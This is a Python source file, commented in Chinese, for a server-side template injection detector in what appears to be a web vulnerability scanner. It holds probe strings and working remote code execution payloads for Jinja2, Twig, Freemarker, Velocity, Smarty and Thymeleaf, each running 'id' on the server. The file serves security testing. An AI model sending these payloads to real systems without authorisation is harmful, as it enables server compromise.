"""
SSTI (服务端模板注入) 检测器

检测各种模板引擎的注入漏洞
"""

from typing import List, Optional, Dict, Any, Tuple
import re
import logging
from urllib.parse import urlparse, parse_qs

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType
from ..factory import register_detector
from ..payloads import get_payloads, PayloadCategory

logger = logging.getLogger(__name__)


@register_detector('ssti')
class SSTIDetector(BaseDetector):
    """SSTI (服务端模板注入) 检测器

    支持的模板引擎:
    - Jinja2 (Python)
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - Mako (Python)
    - Thymeleaf (Java)
    - Pebble (Java)

    使用示例:
        detector = SSTIDetector()
        results = detector.detect("https://example.com/greet", params={"name": "test"})
    """

    name = 'ssti'
    description = '服务端模板注入漏洞检测器'
    vuln_type = 'ssti'
    severity = Severity.CRITICAL
    detector_type = DetectorType.INJECTION
    version = '2.0.0'

    # 模板引擎探测 payload 和预期响应
    PROBE_PAYLOADS = [
        # 通用数学表达式探测
        ('{{7*7}}', '49', ['jinja2', 'twig', 'nunjucks']),
        ('${7*7}', '49', ['freemarker', 'velocity', 'groovy']),
        ('#{7*7}', '49', ['thymeleaf', 'spring_el']),
        ('<%= 7*7 %>', '49', ['erb', 'ejs']),
        ('${7*7}', '49', ['jsp_el']),
        ("{{7*'7'}}", '7777777', ['jinja2']),  # Jinja2 特有
        ('${{7*7}}', '49', ['thymeleaf']),
        ('*{7*7}', '49', ['thymeleaf']),

        # 字符串操作探测
        ("{{\"foo\".upper()}}", 'FOO', ['jinja2']),
        ("${\"foo\"?upper_case}", 'FOO', ['freemarker']),
        ("{{\"foo\"|upper}}", 'FOO', ['twig']),

        # 随机数探测（避免缓存）
        ('{{range(1,10)|random}}', r'[1-9]', ['jinja2', 'twig']),
    ]

    # RCE 探测 payload
    RCE_PAYLOADS = {
        'jinja2': [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ],
        'twig': [
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{_self.env.setCache('twig.cache.file')}}{{_self.env.loadTemplate('system')}}",
        ],
        'freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
        ],
        'velocity': [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        ],
        'smarty': [
            "{php}echo `id`;{/php}",
            "{system('id')}",
        ],
        'thymeleaf': [
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::",
            "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
    }

    # 命令执行成功标志
    RCE_SUCCESS_PATTERNS = [
        r'uid=\d+\([a-z_][a-z0-9_-]*\)',
        r'root:x?:0:0:',
        r'\[subclass\s+\d+\]',
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """初始化检测器

        Args:
            config: 配置选项
                - max_payloads: 最大 payload 数量
                - check_rce: 是否检测 RCE
                - detect_engine: 是否识别模板引擎
        """
        super().__init__(config)

        # 加载 payload
        max_payloads = self.config.get('max_payloads', 20)
        self.payloads = self._enhance_payloads(
            get_payloads(PayloadCategory.SSTI, limit=max_payloads)
        )

        # 编译成功模式
        self._rce_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.RCE_SUCCESS_PATTERNS
        ]

        # 配置
        self.check_rce = self.config.get('check_rce', True)
        self.detect_engine = self.config.get('detect_engine', True)

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测 SSTI 漏洞

        Args:
            url: 目标 URL
            **kwargs:
                params: GET 参数字典
                data: POST 数据字典
                method: HTTP 方法
                headers: 请求头

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        # 获取参数
        params = kwargs.get('params', {})
        data = kwargs.get('data', {})
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        # 解析 URL 参数
        if not params:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # 测试 GET 参数
        if params:
            param_results = self._test_parameters(url, params, 'GET', headers)
            results.extend(param_results)

        # 测试 POST 数据
        if data and method == 'POST':
            data_results = self._test_parameters(url, data, 'POST', headers)
            results.extend(data_results)

        self._log_detection_end(url, results)
        return results

    def _test_parameters(
        self,
        url: str,
        params: Dict[str, str],
        method: str,
        headers: Dict[str, str]
    ) -> List[DetectionResult]:
        """测试参数中的 SSTI

        Args:
            url: 目标 URL
            params: 参数字典
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果列表
        """
        results = []

        for param_name, original_value in params.items():
            # 第一步：探测模板注入
            engine, evidence = self._probe_template_injection(
                url, params, param_name, method, headers
            )

            if engine:
                confidence = 0.9
                rce_possible = False

                # 第二步：如果检测到模板引擎，尝试 RCE
                if self.check_rce and engine in self.RCE_PAYLOADS:
                    rce_result = self._check_rce(
                        url, params, param_name, engine, method, headers
                    )
                    if rce_result:
                        rce_possible = True
                        confidence = 0.95
                        evidence = rce_result

                test_payload = evidence.get('payload', '')
                test_params = params.copy()
                if param_name:
                    test_params[param_name] = test_payload
                request_info = self._build_request_info(
                    method=method,
                    url=url,
                    headers=headers,
                    params=test_params if method == 'GET' else None,
                    data=test_params if method != 'GET' else None
                )
                results.append(self._create_result(
                    url=url,
                    vulnerable=True,
                    param=param_name,
                    payload=test_payload,
                    evidence=evidence.get('evidence', ''),
                    confidence=confidence,
                    verified=rce_possible,
                    request=request_info,
                    remediation="使用安全的模板引擎配置，禁用危险的函数和对象访问",
                    references=[
                        "https://portswigger.net/research/server-side-template-injection",
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"
                    ],
                    extra={
                        'template_engine': engine,
                        'rce_possible': rce_possible
                    }
                ))

        return results

    def _probe_template_injection(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Tuple[Optional[str], Dict[str, Any]]:
        """探测模板注入

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            (模板引擎类型, 证据信息) 或 (None, {})
        """
        for payload, expected, engines in self.PROBE_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                # 检查预期响应
                if expected.startswith(r'['):
                    # 正则匹配
                    if re.search(expected, response.text):
                        return (engines[0], {
                            'payload': payload,
                            'evidence': f"正则匹配: {expected}",
                            'expected': expected
                        })
                elif expected in response.text:
                    return (engines[0], {
                        'payload': payload,
                        'evidence': f"响应包含预期输出: {expected}",
                        'expected': expected
                    })

            except Exception as e:
                logger.debug(f"SSTI 探测失败: {e}")

        return (None, {})

    def _check_rce(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        engine: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[Dict[str, Any]]:
        """检测 RCE

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            engine: 模板引擎类型
            method: HTTP 方法
            headers: 请求头

        Returns:
            RCE 证据或 None
        """
        rce_payloads = self.RCE_PAYLOADS.get(engine, [])

        for payload in rce_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                # 检查 RCE 成功标志
                for pattern in self._rce_patterns:
                    match = pattern.search(response.text)
                    if match:
                        return {
                            'payload': payload,
                            'evidence': match.group(0),
                            'rce_confirmed': True
                        }

            except Exception as e:
                logger.debug(f"SSTI RCE 检测失败: {e}")

        return None

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        return self.payloads
